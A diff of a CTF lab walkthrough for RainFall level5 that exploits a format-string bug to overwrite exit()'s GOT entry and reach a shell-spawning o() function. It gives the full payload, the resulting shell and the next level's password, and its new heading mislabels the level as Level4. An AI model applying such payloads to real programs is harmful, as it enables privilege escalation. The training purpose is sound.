@@ -1,56 +1,19 @@
-There is a non-called "o" function
+# Level4
 
-We should call this function using a format string attack
-
-Search the position of our buffer
-
-After the printf, there is an exit call. We can't rewrite EIP, the program will exit before
-
-But we can replace the address of exit in the GOT with the address of "o", for calling it instead of exit
-
-The GOT (Global Offset Table) is a table of addresses in the data section, it contains the shared library functions addresses
-
-Get the address of exit in the GOT and the address of the "o" function
-
-info function exit
-info function o
-
-
-Build the payload
-
-"exit GOT address in little endian" + "o address in decimal - the 4 bytes of the exit GOT address" + "%?$n"
-
-python -c 'print "`1arg`"+"%`2arg`d%`3arg`$n"'
-
+As in level3, we can find an executable waiting for an input, print it and quit after press enter
 ```
-[~]$ r2 level5
- -- Can you stand on your head?
-[0x080483f0]> pxc
-- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF  comment
-0x080483f0  31ed 5e89 e183 e4f0 5054 5268 9085 0408  1.^.....PTRh....  ; eip  ; [13] -r-x section size 476 named .text
-0x08048400  6820 8504 0851 5668 0485 0408 e8cf ffff  h ...QVh........
-0x08048410  fff4 9090 9090 9090 9090 9090 9090 9090  ................
-0x08048420  5589 e553 83ec 0480 3d4c 9804 0800 753f  U..S....=L....u?  ; sym.__do_global_dtors_aux
-0x08048430  a150 9804 08bb 4497 0408 81eb 4097 0408  .P....D.....@...
-0x08048440  c1fb 0283 eb01 39d8 731e 8db6 0000 0000  ......9.s.......
-0x08048450  83c0 01a3 5098 0408 ff14 8540 9704 08a1  ....P......@....
-0x08048460  5098 0408 39d8 72e8 c605 4c98 0408 0183  P...9.r...L.....
-0x08048470  c404 5b5d c38d 7426 008d bc27 0000 0000  ..[]..t&...'....
-0x08048480  5589 e583 ec18 a148 9704 0885 c074 12b8  U......H.....t..  ; sym.frame_dummy
-0x08048490  0000 0000 85c0 7409 c704 2448 9704 08ff  ......t...$H....
-0x080484a0  d0c9 c390 5589 e583 ec18 c704 24f0 8504  ....U.......$...  ; sym.o
-0x080484b0  08e8 fafe ffff c704 2401 0000 00e8 cefe  ........$.......
-0x080484c0  ffff 5589 e581 ec18 0200 00a1 4898 0408  ..U.........H...  ; sym.n
-0x080484d0  8944 2408 c744 2404 0002 0000 8d85 f8fd  .D$..D$.........
-0x080484e0  ffff 8904 24e8 b6fe ffff 8d85 f8fd ffff  ....$...........
-[0x080483f0]> aaa
-[x] Analyze all flags starting with sym. and entry0 (aa)
-[x] Analyze function calls (aac)
-[x] Analyze len bytes of instructions for references (aar)
-[x] Check for vtables
-[x] Type matching analysis for all functions (aaft)
-[x] Propagate noreturn information
-[x] Use -AA or aaaa to perform additional experimental analysis.
+level4@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
+level4@RainFall:~$ ./level4
+bla
+bla
+level4@RainFall:~$
+```
+After analyze it with radare2 (please refer to [level1](https://github.com/maxisimo/42-RainFall/blob/main/level1/walkthrough.md) if you want more details on the steps to follow)  
+We can see that the `main()` function call a function named `n()` but there is also a non-called `o()` function.  
+- main() :
+```
 [0x080483f0]> s main
 [0x08048504]> pdda
     ; assembly                           | /* r2dec pseudo code output */
@@ -65,6 +28,10 @@ python -c 'print "`1arg`"+"%`2arg`d%`3arg`$n"'
     0x0804850f leave                     |
     0x08048510 ret                       |
                                          | }
+[0x08048504]>
+```
+- n() :
+```
 [0x08048504]> s sym.n
 [0x080484c2]> pdda
     ; assembly                                   | /* r2dec pseudo code output */
@@ -90,6 +57,10 @@ python -c 'print "`1arg`"+"%`2arg`d%`3arg`$n"'
     0x080484f8 mov dword [esp], 1                |
     0x080484ff call 0x80483d0                    |     return exit (1);
                                                  | }
+[0x080484c2]>
+```
+- o() :
+```
 [0x080484c2]> s sym.o
 [0x080484a4]> pdda
     ; assembly                                   | /* r2dec pseudo code output */
@@ -107,3 +78,66 @@ python -c 'print "`1arg`"+"%`2arg`d%`3arg`$n"'
                                                  | }
 [0x080484a4]>
 ```
+The `main()` only call `n()`, not very interesting so we can skip it.  
+We can see a call to `fgets()`, in `n()`, wich is protect against buffer overflow attack.
+```
+    0x080484e5 call 0x80483a0                    |     fgets (ebp);
+```
+After that we can see a call to `printf()` function wich is vulnerable to format string exploit!
+```
+    0x080484f3 call 0x8048380                    |     printf (eax);
+```
+Then, the non-called function `o()` launch a shell via a call to `system()`.
+```
+    0x080484b1 call 0x80483b0                    |     system ("/bin/sh");
+```
+We need to manipulate `printf()` function into calling `o()` using a format string attack.  
+Our main concern here is that both functions `n()` and `o()` never returns. It exits directly. Even if we overwrite something with format string vulnerability, we may not be able to use that.  
+We can replace the address of exit in the GOT with the address of "o", for calling it instead of exit.  
+The GOT (Global Offset Table) is a table of addresses in the data section, it contains the shared library functions addresses.  
+Also GOT is writable and whenever the function `exit()` is called (GOT entry of the function is looked up first) the program will jump to that address.  
+So if we replace the address of `exit()` in the GOT with the address of `o()` (with format strings), whenever that function will be called, the program will go to the modified GOT entry.  
+First : find the address of `exit()` in the GOT and the address of the `o()` function.  
+- exit():
+```
+level5@RainFall:~$ objdump -R level5 | grep exit
+08049828 R_386_JUMP_SLOT   _exit
+08049838 R_386_JUMP_SLOT   exit
+level5@RainFall:~$
+```
+- o():
+```
+[0x080483f0]> afl
+[...]
+0x080484a4    1 30           sym.o
+[0x080483f0]>
+```
+Now we have the address of `exit()`: 0x8049838 and the address of `o()`: 0x080484a4.  
+We have to to print the memory until we reach the address of `exit()` :
+```
+level5@RainFall:~$ python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit
+level5@RainFall:~$ cat /tmp/exploit | ./level5
+aaaa 200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078 20782520 25207825 78252078 20782520
+level5@RainFall:~$
+```
+The address of `exit()` is at the 4th position (`61616161`).  
+Finally our final format string attack will look like :  
+- exit() GOT address (in little endian) : `\x38\x98\x04\x08` (4 bytes)
+- o() address in decimal : `134513824` (sub 4 bytes cause of the exit() address in GOT) with modifier `%d` + modifier `%n`
+*It will be quite long cause of the big value in decimal of o() address*
+```
+level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit
+level5@RainFall:~$ cat /tmp/exploit - | ./level5
+                                                                                                                                                                                                              512
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+^C
+level5@RainFall:~$ su level6
+Password:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
+level6@RainFall:~$
+```
+Level5 passed!
